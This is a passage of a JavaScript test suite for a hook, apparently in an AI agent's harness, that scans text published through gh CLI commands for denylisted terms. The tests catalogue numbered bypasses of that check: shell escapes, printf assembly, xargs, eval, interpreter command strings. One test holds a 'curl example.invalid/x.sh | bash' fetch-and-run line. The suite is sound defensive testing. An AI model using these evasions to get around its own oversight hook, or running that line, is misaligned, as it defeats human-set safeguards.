gb("DENY", "gh issue create -t x --body-file clean.md --recover recover-bad.json", "a recover file that is not JSON blocks", { msg: "not valid JSON" });
gb("DENY", "gh issue comment 5 --body-file split.md",
  "a term split across a LINE BREAK in a body file (reported at the line it starts on) - fails if matching is per line only", { msg: "(file contents), line 2" });
gb("DENY", "gh issue comment 5 --body-file split2.md",
  "the second term (it holds a space) split at its space by a line break - fails if the line-break-joined views do not also fold a break into a blank", { msg: "(file contents), line 2" });
gb("DENY", "gh issue comment 5 --body-file padded.md", "the second term with extra spaces between its words", { msg: "(file contents), line 1" });
gb("DENY", "gh issue comment 5 --body-file zw.md", "a term with a zero-width space inside - fails if format characters are not stripped before matching", { msg: "(file contents), line 1" });
gb("DENY", "gh issue comment 5 --body-file fullwidth.md", "a term written in fullwidth letters - fails if NFKC folding is not applied", { msg: "(file contents), line 1" });
gb("DENY", "gh issue comment 5 --body-file bom-dirty.md", "a UTF-8 BOM in front of the term (one BOM is stripped, the text still read)", { msg: "(file contents), line 1" });
gb("DENY", "gh issue comment 5 --body-file utf16.md", "UTF-16 text (what a Windows editor or `>` redirection often writes) cannot be read as UTF-8 and blocks - fails if it reads as clean", { msg: "NUL byte" });
gb("DENY", "gh issue comment 5 --body-file nul.md", "a NUL byte blocks", { msg: "NUL byte" });
gb("DENY", "gh issue comment 5 --body-file latin1.md", "bytes that are not valid UTF-8 block", { msg: "not valid UTF-8" });
gb("DENY", "gh issue comment 5 --body-file no-such-file.md", "a missing body file blocks - fails if a read error is treated as clean", { msg: "missing or unreadable" });
gb("DENY", "gh issue comment 5 --body-file sub", "a directory is not a regular file", { msg: "not a regular file" });
gb("DENY", "gh issue comment 5 --body-file -", "stdin as the body file: the text comes from something the hook cannot read", { msg: "stdin or nothing" });
gb("DENY", "gh issue comment 5 --body-file /dev/stdin", "the stdin device path is not a regular file", { msg: "--body-file:" });
gb("DENY", "gh issue comment 5 -F big.md", "a file over the size cap blocks", { msg: "larger than" });
gb("DENY", (x) => "cd " + GP(x, "sub") + " && gh issue comment 5 --body-file b.txt",
  "BYPASS 13 - a cd before gh: the relative path would resolve somewhere the hook cannot follow - fails if it is resolved against the hook cwd", { msg: "after a cd the file path must be absolute" });
gb("DENY", (x) => "cd " + GP(x, "sub") + "; gh issue comment 5 --body-file ../dirty.md", "the same with ; and a path that climbs out", { msg: "after a cd the file path must be absolute" });
gb("DENY", (x) => "cd " + GP(x, "sub") + " && gh issue comment 5 --body-file " + GP(x, "dirty.md"), "cd then an ABSOLUTE path: accepted as a path, and its dirty contents found", { msg: "(file contents), line 3" });
gb("DENY", (x) => "cd " + GP(x, "sub") + " && cd " + GP(x, "sub") + " && gh issue comment 5 --body-file " + GP(x, "clean.md"), "two cd: not the strict form", MB);

// ---- Tier A: short title-like fields are scanned inline; body and notes are not accepted inline ---------
gb("DENY", "gh issue create --title '" + TA + " x' --body-file clean.md", "a title with the term (single-quoted)", { msg: "gh issue create --title, line 1" });
gb("DENY", "gh issue create -t \"x " + TA.toUpperCase() + "\" --body-file clean.md", "a double-quoted title, upper-cased: matching is case-insensitive", { msg: "gh issue create --title, line 1" });
gb("DENY", "gh issue create --title=" + TA + " --body-file clean.md", "the --title=value form", { msg: "gh issue create --title, line 1" });
gb("DENY", "gh issue create --title='x " + TA + "' --body-file clean.md", "--title='...' (a bare prefix and one quoted string)", { msg: "gh issue create --title, line 1" });
gb("DENY", "gh pr create -dt '" + TA + "' --body-file clean.md", "a boolean (-d) then the title letter in one cluster: the TITLE is the cluster's value", { msg: "gh pr create --title, line 1" });
gb("DENY", "gh pr merge 5 --squash --subject '" + TA + "'", "pr merge --subject (the squash commit subject)", { msg: "gh pr merge --subject, line 1" });
gb("DENY", "gh issue close 5 --comment '" + TA + "'", "issue close --comment", { msg: "gh issue close --comment, line 1" });
gb("DENY", "gh label create x --description '" + TA + "'", "label --description", { msg: "gh label create --description, line 1" });
gb("DENY", "gh repo new demo -d '" + TA + "'", "the `new` alias of repo create, short description flag", { msg: "gh repo create --description, line 1" });
gb("DENY", "gh pr new --title '" + TA + "' --body-file clean.md", "the `new` alias of pr create", { msg: "gh pr create --title, line 1" });
gb("DENY", "gh pr revert 5 --title '" + TA + "' --body-file clean.md", "pr revert publishes a title", { msg: "gh pr revert --title, line 1" });
gb("DENY", "gh api repos/o/r/issues -f title=ok -f note='" + TA + "'", "a gh api -f value (the second -f): the value is scanned, not the key", { msg: "gh api -f #2, line 1" });
gb("DENY", "gh api repos/o/r/issues -F title=" + TA, "a gh api -F value", { msg: "gh api -F #1, line 1" });
gb("DENY", "gh api repos/o/r/issues -if title=" + TA, "gh api: -i is boolean, -f takes the next argument", { msg: "gh api -f #1, line 1" });
gb("DENY", "gh issue create --title ok --body-file clean.md --attach './p.png#alt " + TA + "'", "alt text after # is published", { msg: "--attach (alt text), line 1" });
gb("DENY", "gh issue comment 1 -F clean.md --attach './a.png#" + TA + "'", "alt text on issue comment", { msg: "--attach (alt text), line 1" });
gb("DENY", "gh issue comment 1 -F clean.md --attach ./a.png#clean", "an unquoted # is a comment mark, so not the strict form", MB);
gb("DENY", "gh issue create --title \"a $x b\" --body-file clean.md",
  "a double-quoted title holding a dollar sign: not the strict form, and a publishing gh outside it blocks", MB);
gb("DENY", "gh issue create --title \"a " + BT2 + "x" + BT2 + " b\" --body-file clean.md", "a double-quoted title holding backticks", MB);
gb("DENY", "gh issue create --title \"a " + BSL + "n b\" --body-file clean.md", "a double-quoted title holding a backslash", MB);
gb("DENY", "gh issue create --title \"a !x b\" --body-file clean.md", "a double-quoted title holding !", MB);
gb("DENY", "gh issue create --title a$x --body-file clean.md", "a bare word holding an expansion", MB);
gb("DENY", "gh issue create --title 'it''s' --body-file clean.md", "adjacent quoted strings (a doubled quote)", MB);
gb("DENY", "gh issue create --title 'a'b --body-file clean.md", "text glued after a quoted string", MB);
gb("DENY", "gh issue create --title '' --body-file clean.md", "an empty string (Windows PowerShell 5.1 would drop it from the argument list)", MB);
gb("DENY", "gh issue create --title 'one two' --body-file clean.md 2>&1", "a redirection is not the strict form", MB);
gb("DENY", "gh issue create --title ok --body-file clean.md # " + TA, "a trailing comment is not the strict form", MB);
gb("DENY", "gh issue create --title ok --body-file clean.md;", "a trailing ;", MB);
gb("DENY", "gh issue comment 5 --body \"clean\"", "CONTROL - an inline body is refused even when clean, with the advice to use a file", MI);
gb("DENY", "gh issue comment 5 --body \"" + TA + "\"", "an inline body with the term: refused as inline (the refusal comes first)", MI);
gb("DENY", "gh issue comment 5 --body=ok", "--body=value", MI);
gb("DENY", "gh issue comment 5 -b ok", "-b value", MI);
gb("DENY", "gh issue comment 5 -bok", "-bvalue", MI);
gb("DENY", "gh issue create -t sloop -wb ok", "a boolean (-w) then -b in one cluster: the cluster walk finds the body flag - fails if only the first letter is read", { msg: "gh issue create --body: inline" });
gb("DENY", "gh issue create -t sloop -wb=ok", "cluster, then = and the value", { msg: "gh issue create --body: inline" });
gb("DENY", "gh release create v1 --title t --notes ok", "release --notes inline", { msg: "gh release create --notes: inline" });
gb("DENY", "gh release create v9.9.9 -n ok", "release -n inline", { msg: "gh release create --notes: inline" });
gb("DENY", "gh pr review 5 -b ok", "pr review body inline", { msg: "gh pr review --body: inline" });
gb("DENY", "gh pr merge 5 --squash --body ok", "pr merge body inline", { msg: "gh pr merge --body: inline" });
gb("DENY", "gh api repos/o/r/issues -f body=ok", "an inline api body field (key body) is refused like --body", { msg: "an inline body field is not accepted" });
gb("DENY", "gh api repos/o/r/issues -F notes=ok", "an inline api notes field", { msg: "an inline notes field is not accepted" });
gb("DENY", "gh --body ok issue comment 5", "a TEXT flag before the verb is the verb's flag: the inline body is refused", { msg: "gh issue comment --body: inline" });
gb("DENY", "gh -b ok -t sloop issue create -R o/r --body-file dirty.md", "leading text flags plus a body file after the verb: both found", { msg: "gh issue create --body: inline" });

// fail-closed controls: a publishing command in the strict form, so the only thing that can block it is the control
gb("DENY", "gh issue comment 5 --body-file clean.md", "CONTROL (fail closed) - denylist file MISSING blocks every gh publish even with clean text", { dl: "missing", msg: "denylist file missing" });
gb("DENY", "gh issue comment 5 --body-file clean.md", "CONTROL (fail closed) - a denylist with only a comment and blanks blocks", { dl: "empty", msg: "no terms" });
gb("DENY", "gh issue comment 5 --body-file clean.md",
  "CONTROL (blocks on its own errors) - the scanner script is ABSENT: the saved command alone must turn node's failure into exit 2", { scanner: "absent" });
gb("DENY", "gh issue comment 5 --body-file dirty.md", "the XDG_CONFIG_HOME default location - fails if only DENYLIST_FILE is honoured", { dl: "xdg", msg: "(file contents), line 3" });
gb("DENY", "gh issue comment 5 --body-file dirty.md", "the $HOME/.config default location", { dl: "home", msg: "(file contents), line 3" });
gb("DENY", "(garbage stdin)", "unparseable hook JSON blocks - fails if the parse error is swallowed", { stdinShape: "garbage", msg: "not valid JSON" });
gb("DENY", "echo hi", "a tool this hook does not understand blocks (matcher drift must not pass silently)", { tool: "Read", msg: "not Bash or PowerShell" });
gb("DENY", "gh issue comment 5 --body-file clean.md",
  "CONTROL (a hang blocks) - the scanner stub never returns: only the `timeout` inside the saved command can turn that into exit 2 (124), " +
  "and the per-row limit scores a missing bound as ERROR, never a stall", { scanner: "hang", msg: "did not complete (exit 124)" });
gb("DENY", "gh issue comment 5 --body-file clean.md",
  "CONTROL (a missing tool blocks) - the saved command run with an empty PATH (a prefix only; the command is the one on disk): " +
  "timeout cannot start, exit 127, and the fallback must block with its fixed message", { prefix: "PATH=/no-such-dir; ", msg: "did not complete (exit 127)" });

// hard-blocked verbs: text the scan cannot read stays blocked even alone and in the strict form (the decision of 2026-11-15)
gb("DENY", "gh gist create f.txt", "gist create publishes a file this scan does not read", { msg: "gh gist: a verb this scan does not know" });
gb("DENY", "gh gist edit abc", "gist edit", { msg: "gh gist: a verb this scan does not know" });
gb("DENY", "gh workflow run x.yml -f note=ok", "workflow run publishes inputs", { msg: "gh workflow: a verb this scan does not know" });
gb("DENY", "gh variable set NAME --body ok", "variable set publishes a value", { msg: "gh variable: a verb this scan does not know" });
gb("DENY", "gh discussion create -t x -b ok", "a discussion write", { msg: "gh discussion: a verb this scan does not know" });
gb("DENY", "gh project item-create 1 --title ok", "a project item verb", { msg: "gh project: a verb this scan does not know" });
gb("DENY", "gh extension exec foo", "extension exec runs anything", { msg: "gh extension: a verb this scan does not know" });
gb("DENY", "gh alias set co 'pr checkout'", "defining a user alias", { msg: "gh alias: a verb this scan does not know" });
gb("DENY", "gh my-extension run", "an extension or user alias", { msg: "a command this scan does not know" });
gb("DENY", "gh frobnicate", "a top-level command no table knows", { msg: "a command this scan does not know" });
gb("DENY", "gh constructor x", "a word that names a property of every JS object - fails if the tables are read with a plain `in` lookup", { msg: "a command this scan does not know" });
gb("DENY", "gh repo autolink create AB https://example.invalid/<num>", "a sub-group verb that publishes a URL template", { msg: "gh repo autolink: a verb this scan does not know" });
gb("DENY", "gh issue artifact create 5 --body-file x.md", "a nested verb that publishes text", { msg: "does not know" });
gb("DENY", "gh agent-task create 'do it'", "agent-task create publishes a prompt", { msg: "gh agent-task: a verb this scan does not know" });
gb("DENY", "gh issue frobnicate 5", "an unknown verb blocks even with NO text flag (allow only on positive recognition)", { msg: "does not know" });
gb("DENY", "gh issue frobnicate 5 --body ok", "an unknown verb with a text flag", { msg: "does not know" });
gb("DENY", "gh release frobnicate v1 -n ok", "unknown release verb, short text flag", { msg: "does not know" });
gb("DENY", "gh issue create --newflag ok -t x --body-file clean.md", "a long flag the covered verb's table does not list (it could be a text flag of a newer gh)", { msg: "a long flag this scan does not know" });
gb("DENY", "gh issue create -t sloop -wZ ok --body-file clean.md", "a cluster letter the table does not know blocks even with clean text", { msg: "letter this scan does not know" });
gb("DENY", "gh --frobnicate issue create -t sloop --body-file clean.md", "an unknown leading flag: cobra pairs it with `issue`, so `create` would be the command, which no table places", { msg: "a command this scan does not know" });
gb("DENY", "gh --frobnicate=1 issue create -t sloop --body-file clean.md", "an unknown leading flag in the --flag=value form", { msg: "flag before the verb that this scan does not know" });
gb("DENY", "gh -x y issue view 5", "an unknown two-character leading flag with a read-only verb behind it blocks too", { msg: "flag before the verb that this scan does not know" });

// ---- Tier A: what the delivery ritual runs, in the strict form, with clean text - all ALLOW -------------
gb("ALLOW", (x) => "gh pr create --draft --base dev --title \"chore: tidy the scow dock\" --body-file " + GP(x, "clean.md"), "ritual: open a draft PR (an absolute body file)");
gb("ALLOW", "gh pr create --fill --base dev --draft", "ritual: --fill takes the text from commits the push already published");
gb("ALLOW", (x) => "gh pr edit 9 --body-file " + GP(x, "clean.md"), "ritual: rewrite a PR body");
gb("ALLOW", "gh pr ready 9", "ritual: mark ready (a read-only-class verb, needs no denylist)", { dl: "missing" });
gb("ALLOW", "gh pr merge 9 --squash --match-head-commit " + SHA, "ritual: merge pinned to a head commit");
gb("ALLOW", "gh pr merge 9 --squash --auto", "ritual: merge with no text fields");
gb("ALLOW", (x) => "gh issue comment 9 --body-file " + GP(x, "clean.md"), "ritual: a comment from a file");
gb("ALLOW", "gh issue close 9 --comment \"merged in #9\"", "ritual: close with a short plain comment (a # inside quotes is text)");
gb("ALLOW", "gh issue edit 9 --remove-label blocked", "ritual: label edit");
gb("ALLOW", (x) => "gh issue create --title \"file the scow ledger\" --body-file " + GP(x, "clean.md") + " --label should", "ritual: file an issue");
gb("ALLOW", (x) => "gh release create v9.9.9 --title 'v9.9.9 \"Scow\"' --notes-file " + GP(x, "clean.md") + " --verify-tag --latest",
  "ritual: a release - the single-quoted title holds double quotes (literal in bash)");
gb("ALLOW", "gh api graphql -f query='query { viewer { login } }'", "a graphql READ with a plain quoted field: braces inside single quotes are text");
gb("ALLOW", "gh pr view 9 --json body --jq '.body'", "ritual: read a PR body", { dl: "missing" });
gb("ALLOW", "gh issue comment 5 --body-file clean.md", "CONTROL - a clean RELATIVE body file; fails if every publish is denied");
gb("ALLOW", "gh issue comment 5 -F clean.md --repo o/" + TA, "a term in a repo flag (not published text)");
gb("ALLOW", (x) => "gh issue comment 5 --body-file " + GP(x, TA + "-clean.md"), "the hub's finding: a term only in a file PATH is not published - fails if the whole command line is scanned");
gb("ALLOW", "gh issue edit 5 --add-label " + TA + " --repo o/" + TA, "a term in non-text flags (a label, a repo)");
gb("ALLOW", "gh pr create -t ok -F clean.md -R o/" + TA + " -dl x", "a cluster in front of a repo flag with a term-bearing repo");
gb("ALLOW", "gh issue create -t sloop -F clean.md -wl " + TA, "a cluster ending in the value-taking NON-text -l: its value is a label name, not published text - fails if every cluster value is scanned");
gb("ALLOW", "gh issue create -t sloop -F clean.md -wl" + TA, "the same with the value attached");
gb("ALLOW", "gh issue create -t sloop -F clean.md -we", "CONTROL - a boolean-only cluster with clean text");
gb("ALLOW", "gh api repos/o/r/issues -iq " + TA + " -f title=ok", "gh api: -q is a jq filter, not a published field");
gb("ALLOW", "gh api repos/o/r/issues -f " + TA + "=x", "a term in a field KEY - only values are published text");
gb("ALLOW", "gh api repos/o/r/issues -f title=ok -F body=@clean.md --input clean.json", "clean api fields, @file and --input");
gb("ALLOW", "gh issue create -t x -F clean.md -T " + TA, "issue create -T is a template NAME (a repo-committed file, scanned by pre-push), never read here");
gb("ALLOW", "gh pr create -t x -F clean.md -T clean.md", "a clean pr template file");
gb("ALLOW", "gh issue create -t x -F clean.md --recover recover-clean.json", "a clean recover file");
gb("ALLOW", "gh issue create -t x -F clean.md --attach './" + TA + ".png'", "a term only in the attached file's PATH (no # alt text): paths are never scanned");
gb("ALLOW", "gh issue create -t x -F clean.md --attach './a.png#clean alt'", "clean alt text");
gb("ALLOW", "gh release create v1 --generate-notes", "--generate-notes: GitHub builds the notes from merged PRs");
gb("ALLOW", "gh release create v1 --notes-from-tag -t ok", "--notes-from-tag: the tag message was pushed with the tag");
gb("ALLOW", "gh pr create --fill-first --draft", "--fill-first");
gb("ALLOW", "gh pr create -e", "-e: an interactive editor the hook cannot see");
gb("ALLOW", (x) => "cd " + GP(x, "sub") + " && gh issue comment 5 --body-file " + GP(x, "clean.md"), "cd then an ABSOLUTE clean file path");
gb("ALLOW", (x) => "cd " + GP(x, "sub") + "; gh issue comment 5 -F " + GP(x, "clean.md"), "the same with ;");
gb("ALLOW", (x) => "cd " + GP(x, "sub") + " && gh pr view 9 --json state", "cd then a read");
gb("ALLOW", "gh issue comment 5 --body-file clean.md", "a clean body file on the default-location denylists (home)", { dl: "home" });
gb("ALLOW", "gh pr view 5 --json body", "read-only gh passes with no denylist - fails if reads need the file", { dl: "missing" });
gb("ALLOW", "gh --version", "gh's own flags with no command", { dl: "missing" });
gb("ALLOW", "gh issue list -t '{{.title}}' --search " + TA, "a known read-only verb whose -t is a template, not text", { dl: "missing" });
gb("ALLOW", "gh pr co 5", "the read-only alias pr co", { dl: "missing" });
gb("ALLOW", "gh issue ls --search " + TA, "the read-only alias issue ls", { dl: "missing" });
gb("ALLOW", "gh issue -R o/r view 5", "flags before the verb with no text flag anywhere", { dl: "missing" });
gb("ALLOW", "gh issue --repo o/r view 5", "the repo flag between the group and a read-only verb", { dl: "missing" });
gb("ALLOW", "gh --repo o/" + TA + " pr view 5 --json body", "a read-only verb behind --repo with a term-bearing repo", { dl: "missing" });
gb("ALLOW", "gh -R o/r issue create -t sloop -F clean.md", "CONTROL - a clean call with a leading -R; fails if every leading flag blocks");
gb("ALLOW", "gh auth status", "a recognised no-text command (any verb)", { dl: "missing" });
gb("ALLOW", "gh run list --limit 3", "workflow runs, read-only", { dl: "missing" });
gb("ALLOW", "gh workflow list", "a recognised no-text verb of a partially covered command", { dl: "missing" });
gb("ALLOW", "gh search issues sloop --repo o/r", "search", { dl: "missing" });
gb("ALLOW", "gh status", "status", { dl: "missing" });
gb("ALLOW", "gh issue artifact list 5", "a read-only sub-group verb", { dl: "missing" });
gb("ALLOW", "gh extension list", "extension list", { dl: "missing" });
gb("ALLOW", "gh api repos/o/r/pulls/5 --jq .title", "a read-only api call", { dl: "missing" });
gb("ALLOW", "gh.exe pr view 5", "gh.exe is the command word", { dl: "missing" });

// ===== TIER B: everything else that mentions gh - only searched for gh invocations =================
// read-only gh anywhere in a compound command passes (no denylist needed)
gb("ALLOW", "cd x; gh pr view 9 --json state --jq .state; gh run list | head", "compound read-only gh (the ritual's status line)", { dl: "missing" });
gb("ALLOW", "for i in 1 2; do gh issue view $i; done", "a loop of reads", { dl: "missing" });
gb("ALLOW", "gh pr view 9 --json body --jq '.body' | grep -c sloop", "a read piped to a filter", { dl: "missing" });
gb("ALLOW", "gh pr view 9 --json state > out.txt", "a read redirected to a file", { dl: "missing" });
gb("ALLOW", "gh pr view 9 2>&1", "a read with a stderr redirection", { dl: "missing" });
gb("ALLOW", "env X=1 gh pr view 5", "a read behind env", { dl: "missing" });
gb("ALLOW", "timeout 5 gh pr view 5", "a read behind timeout", { dl: "missing" });
gb("ALLOW", "command gh pr view 5", "a read behind command", { dl: "missing" });
gb("ALLOW", "gh pr checks 5 --watch && echo done", "a read then another command", { dl: "missing" });
gb("ALLOW", "gh run list --limit 3 && gh run view 5 --log", "reads in sequence", { dl: "missing" });
// a command that merely mentions gh runs no gh invocation
gb("ALLOW", "git commit -m \"docs: gh issue create --body " + TA + "\"", "gh words inside one quoted argument of another command (a commit message)", { dl: "missing" });
gb("ALLOW", "echo " + TA, "CONTROL - not gh at all; fails if the hook denies unconditionally");
gb("ALLOW", "ls -la", "a command that never mentions gh passes even with NO denylist (it is not parsed or scanned)", { dl: "missing" });
gb("ALLOW", "echo gh", "the word gh alone", { dl: "missing" });
gb("ALLOW", "command -v gh >/dev/null && echo yes", "a lookup of gh itself (no command word follows it)", { dl: "missing" });
gb("ALLOW", "which gh", "gh as the argument of which", { dl: "missing" });
gb("ALLOW", "grep -rn gh docs/", "gh as a grep pattern followed by a path - the loose rule needs a gh command word after it", { dl: "missing" });
gb("ALLOW", "git log --oneline -n 3 -- plugins/gh", "a path ending in gh", { dl: "missing" });
gb("ALLOW", "node scripts/denylist-scan.js --help # gh", "a command that merely mentions gh in a comment", { dl: "missing" });
gb("ALLOW", "cat > f <<'EOF'" + NL + TA + NL + "EOF", "a heredoc feeding a NON-gh command is data, not published text", { dl: "missing" });
// a publishing gh outside the strict form blocks, whatever its text
gb("DENY", "echo hi && gh issue comment 5 --body-file clean.md", "COMPOUND - a clean publishing gh behind another command", MB);
gb("DENY", "gh issue comment 5 --body-file clean.md && echo done", "a publishing gh followed by another command", MB);
gb("DENY", "gh issue comment 5 --body-file clean.md" + NL + "gh pr view 1", "two commands on two lines", MB);
gb("DENY", "git push && gh pr create --fill", "push then a fill-only create: the create must be a call of its own", MB);
gb("DENY", "gh pr merge 5 --squash 2>&1", "a redirection on a publishing gh", MB);
gb("DENY", "gh issue comment 5 --body-file clean.md | cat", "a pipe after a publishing gh", MB);
gb("DENY", "true; gh api repos/o/r/issues -f title=ok", "a gh api with a text flag behind another command", MB);
gb("DENY", "GH_REPO=o/r gh issue comment 5 --body-file clean.md", "an environment assignment in front", MB);
gb("DENY", "(gh issue comment 5 --body-file clean.md)", "in a subshell", MB);
gb("DENY", "{ gh issue comment 5 --body-file clean.md; }", "in a brace group", MB);
gb("DENY", "if true; then gh issue comment 5 --body-file clean.md; fi", "after then", MB);
gb("DENY", "for i in 1 2; do gh issue comment $i --body-file clean.md; done", "after do", MB);
gb("DENY", "u=$(gh issue create --title t --body-file clean.md)", "inside a command substitution", MB);
gb("DENY", "find . -name x -exec gh issue comment 1 --body-file clean.md ;", "as a find -exec command", { msg: "appends arguments to the command it runs" });
gb("DENY", "\"gh\" \"ISSUE\" \"Create\" -t x -F clean.md", "the command and verb quoted, the verb in capitals", MB);
gb("DENY", "/usr/bin/gh issue create -t x -F clean.md", "a full path to gh", MB);
gb("DENY", "command gh issue create -t x -F clean.md", "behind `command`", MB);
gb("DENY", "env X=1 gh issue create -t x -F clean.md", "behind env with an assignment", MB);
gb("DENY", "time gh issue create -t x -F clean.md", "behind time", MB);
gb("DENY", "sudo -u me gh issue create -t x -F clean.md", "behind sudo with a valued option", MB);
gb("DENY", "timeout 5 gh issue create -t x -F clean.md", "behind timeout and its duration", MB);
gb("DENY", "nice -n 5 gh issue create -t x -F clean.md", "behind nice with a valued option", MB);
gb("DENY", "gh issue create -t x -F clean.md $(echo --label y)", "a command substitution among the flags", MB);
gb("DENY", "gh issue comment 5 --body-file clean.md" + String.fromCharCode(12) + "&& true", "a form feed: not blanks, so not the strict form", MB);
gb("DENY", "gh issue comment 1 -b " + TA + String.fromCharCode(0xa0) + "x", "a no-break space after a body word", MB);
gb("DENY", "gh issue comment 1 -b " + TA + String.fromCharCode(0x2028) + "x", "U+2028 after a body word", MB);
gb("DENY", String.fromCharCode(0xfeff) + "gh issue comment 1 -b " + TA, "a leading U+FEFF before the command", MB);
gb("DENY", String.fromCharCode(0xa0) + "gh" + String.fromCharCode(0xa0) + "issue comment 1 -b " + TA, "no-break spaces around the command words", MB);

// THE SIXTEEN BYPASSES of the second preflight, each with the fixture term in the published value
gb("DENY", "gh issue comment 1 --body " + BSL + NL + "   \"" + TA + "\"", "BYPASS 1 - a line-continued --body", MB);
gb("DENY", "printf '%s%s' bowsprit- ledger | gh issue comment 1 -F -", "BYPASS 2 - printf assembling the term, piped to -F -", MB);
gb("DENY", "echo -e 'bowsprit-" + BSL + "x6cedger' | gh issue comment 1 -F -", "BYPASS 2 - echo -e with an escape", MB);
gb("DENY", "gh issue comment 1 -b $'bowsprit-ledge" + BSL + "162'", "BYPASS 3 - an octal escape in an ANSI-C string", MB);
gb("DENY", "gh issue comment 1 -b $'" + BSL + "U00000062owsprit-ledger'", "BYPASS 3 - a \\U escape", MB);
gb("DENY", "gh issue comment 1 {-b,bowsprit-ledger}", "BYPASS 4 - brace expansion building the flag and its value", MB);
gb("DENY", "echo bowsprit- >> a.md; echo ledger >> a.md; gh issue comment 1 -F a.md", "BYPASS 5 - appended lines (>>)", MB);
gb("DENY", "echo bowsprit- | tee -a a.md; gh issue comment 1 -F a.md", "BYPASS 5 - tee -a", MB);
gb("DENY", "echo " + TA + " > f.md; gh issue comment 1 -F f.md; echo clean > f.md", "BYPASS 6 - a write AFTER the gh call wins", MB);
gb("DENY", "gh issue comment 1 --body-file <(echo " + TA + ")", "process substitution as the file", MB);
gb("DENY", "cat <(gh issue comment 1 -b " + TA + ")", "a gh command inside a process substitution", MB);
gb("DENY", "cat <<EOF | gh issue comment 1 -F -" + NL + "bowsprit-" + BSL + NL + "ledger" + NL + "EOF", "BYPASS 10 - an unquoted heredoc with a backslash-newline joining the term", MB);
gb("DENY", "echo " + TA + " | xargs -I{} gh issue comment 1 -b {}", "BYPASS 11 - xargs -I{}", { msg: "appends arguments to the command it runs" });
const XB = [
  ["echo \"issue comment 1 --body " + TA + "\" | xargs gh", "xargs appends its stdin to a bare gh: the words after gh are not the words the scan sees"],
  ["xargs -a args.txt gh", "xargs -a appends a file's words to a bare gh"],
  ["echo \"-f body=" + TA + "\" | xargs gh api repos/o/r/issues/1/comments", "xargs behind a method-less gh api, which reads as a GET"],
  ["xargs -n 100 gh", "an xargs option does not make the gh behind it judgeable"],
  ["xargs gh api repos/o/r/issues/1/comments < args.txt", "xargs fed from a redirect"],
  ["ls | sudo xargs gh", "xargs behind a wrapper"],
  ["ls | xargs env gh", "xargs then a wrapper then gh"],
  ["xargs sh -c 'gh issue comment 1 --body " + TA + "'", "xargs running a shell string that mentions gh"],
  ["cat l | parallel gh pr view", "parallel appends its arguments"],
  ["find . -execdir gh pr list ;", "find -execdir"],
  ["find . -ok gh pr list ;", "find -ok"],
  ["fd -x gh pr view", "fd -x appends the match"],
  ["ls | entr gh pr list", "entr runs the command it is given"],
];
XB.forEach((r) => {
  gb("DENY", r[0], "BYPASS 17 - an argument-appending runner: " + r[1] + "; fails if a gh behind a runner is judged as read-only", { msg: "appends arguments to the command it runs" });
});
gp("DENY", "xargs -a args.txt gh", "BYPASS 17 - xargs on the PowerShell entry; fails if xargs is again treated as a transparent wrapper", { msg: "appends arguments to the command it runs" });
gp("DENY", "echo \"-f body=" + TA + "\" | xargs gh api repos/o/r/issues/1/comments", "BYPASS 17 - xargs behind a method-less gh api on the PowerShell entry", { msg: "appends arguments to the command it runs" });
gb("ALLOW", "gh pr view 1 | head", "a read piped to head: gh at the head of a pipeline is not behind a runner", { dl: "missing" });
gb("ALLOW", "git status && gh pr list", "a read after a git command", { dl: "missing" });
gb("ALLOW", "gh issue list | xargs echo", "xargs downstream of gh runs another command; fails if any xargs in the call blocks", { dl: "missing" });
gp("ALLOW", "gh pr view 1 | Select-Object -First 3", "a read piped to a cmdlet on the PowerShell entry", { dl: "missing" });
gb("DENY", "env -S 'gh issue comment 1 -b " + TA + "'", "BYPASS 14 - env -S with a command string", { msg: "a wrapper option hides a command string" });
gb("DENY", "sudo -s 'gh issue comment 1 -b " + TA + "'", "BYPASS 14 - sudo -s with a command string", { msg: "a command string that mentions gh" });
gb("DENY", "tmux new 'gh issue comment 1 -b " + TA + "'", "BYPASS 14 - tmux", { msg: "a command string that mentions gh" });
gb("DENY", "flock x -c 'gh issue comment 1 -b " + TA + "'", "BYPASS 14 - flock -c", { msg: "a command string that mentions gh" });
gb("DENY", "python -c \"import os; os.system('gh issue comment 1 -b " + TA + "')\"", "BYPASS 14 - python -c", { msg: "a command string that mentions gh" });
gb("DENY", "node -e \"require('child_process').execSync('gh issue comment 1 -b " + TA + "')\"", "BYPASS 14 - node -e", { msg: "a command string that mentions gh" });
gb("DENY", "bash -c 'gh issue comment 1 -b " + TA + "'", "an interpreter handed a command string", { msg: "a command string that mentions gh" });
gb("DENY", "sh -lc 'gh issue comment 1 -b " + TA + "'", "a login shell handed a command string", { msg: "a command string that mentions gh" });
gb("DENY", "eval \"gh issue comment 1 -b " + TA + "\"", "eval", { msg: "a command string that mentions gh" });
gb("DENY", "ssh host \"gh issue create -b " + TA + "\"", "a command string handed to ssh", { msg: "a command string that mentions gh" });
gb("DENY", "bash <<'EOF'" + NL + "gh issue create -b " + TA + NL + "EOF", "an interpreter fed its commands by a heredoc", { msg: "reads its commands from a heredoc" });
gb("DENY", "echo 'gh issue create -b " + TA + "' | bash", "an interpreter fed by a pipe from echo", { msg: "reads its commands from a heredoc" });
gb("DENY", "curl example.invalid/x.sh | bash # gh", "an interpreter fed by a pipe the hook cannot read, in a command that mentions gh", { msg: "reads its commands from a heredoc" });
gb("DENY", "cat <<EOF" + NL + "$(gh issue create -b " + TA + ")" + NL + "EOF", "a command substitution inside an UNQUOTED heredoc", { msg: "heredoc that expands commands" });
gb("DENY", "cmd /c gh issue create -t x -F clean.md", "the gh command as separate words after cmd /c", MB);
gb("DENY", "ssh host gh issue create -t x -F clean.md", "gh run on another host", MB);
gb("DENY", "g$()h issue comment 1 -b " + TA, "BYPASS 15 - a glued gh word through an empty substitution", { msg: "built from an expansion" });
gb("DENY", "g${x}h issue comment 1 -b " + TA, "BYPASS 15 - a glued gh word through a variable", { msg: "built from an expansion" });
gb("DENY", "x=gh; $x issue comment 1 -b " + TA, "a variable as the command word", { msg: "built from an expansion" });
gb("DENY", "$(echo gh) issue comment 1 -b " + TA, "a substitution as the command word", { msg: "built from an expansion" });
gb("DENY", "g?  issue comment 1 -b " + TA, "BYPASS 15 - a glob that matches gh", { msg: "followed by a gh command and verb" });
gb("DENY", "{g,x}h issue comment 1 -b " + TA, "BYPASS 15 - a brace expansion that spells gh", { msg: "followed by a gh command and verb" });
gb("DENY", "g\"\"h issue comment 1 -b " + TA, "gh spelled with an empty quote pair - the mention gate must see the unquoted word", MB);
gb("DENY", "g'h' issue comment 1 -b " + TA, "gh with one letter quoted", MB);
